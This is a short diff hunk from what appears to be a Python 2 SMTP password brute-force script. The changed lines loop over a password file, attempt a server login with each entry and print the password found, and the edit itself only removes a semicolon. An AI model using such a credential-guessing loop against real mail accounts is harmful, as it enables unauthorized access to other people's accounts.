@@ -17,7 +17,7 @@ for password in passwfile:
                 smtpserver.login(user, password)
 
                 print "[+] Password Found: %s" % password
-                break;
+                break
 
         except smtplib.SMTPAuthenticationError:
 
